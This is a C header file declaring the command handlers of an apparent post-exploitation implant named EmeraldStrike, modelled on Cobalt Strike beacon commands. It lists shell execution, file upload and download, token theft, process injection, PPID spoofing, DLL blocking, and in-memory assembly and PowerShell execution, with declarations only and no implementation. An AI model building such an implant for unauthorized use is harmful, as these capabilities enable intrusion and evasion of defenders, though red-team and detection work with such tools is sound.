#ifndef EMERALDSTRIKE_COMMANDS_H
#define EMERALDSTRIKE_COMMANDS_H

#include "common.h"
#include "parser.h"
#include "package.h"

typedef VOID (*COMMAND_HANDLER)(PINSTANCE inst, PPARSER args, PPACKAGE response);

typedef struct _COMMAND_ENTRY {
    DWORD           hash;
    COMMAND_HANDLER handler;
} COMMAND_ENTRY, *PCOMMAND_ENTRY;

VOID dispatch_command(PINSTANCE inst, const char* cmd_name, BYTE* args, DWORD args_len,
                      BYTE** out_data, DWORD* out_len, BOOL* out_error);
VOID register_commands(PINSTANCE inst);

// Command handlers
VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_ls(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_cd(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_pwd(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_cat(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_upload(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_download(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_exit(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_sleep(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_whoami(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_getuid(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_ps(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_screenshot(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_run(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_execute(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_make_token(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_steal_token(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_rev2self(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_getprivs(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_ppid(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_blockdlls(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_kill(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_cp(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_mv(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_rm(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_mkdir(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_inline_execute(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_inject(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_config(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_spawnto_x64(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_spawnto_x86(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_argue(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_powerpick(PINSTANCE inst, PPARSER args, PPACKAGE response);

#endif // EMERALDSTRIKE_COMMANDS_H
